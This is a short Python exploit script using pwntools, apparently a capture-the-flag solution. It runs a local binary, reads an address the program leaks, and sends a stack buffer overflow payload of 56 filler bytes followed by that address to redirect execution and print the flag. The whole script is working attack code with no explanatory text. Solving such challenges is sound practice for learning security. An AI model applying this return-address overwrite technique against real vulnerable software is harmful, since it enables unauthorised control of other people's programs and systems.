from pwn import *

context.log_level = 'debug'

conn = process('./main')

line = conn.recvlineS().strip()
address = line.lstrip('👀: ')
address = int(address, 16)

conn.recvuntil('can you guess the position?\n')

payload = b'A' * (56) + p64(address)

conn.sendline(payload)

line = conn.recvline()
flag = conn.recvallS()

conn.close()

print(flag)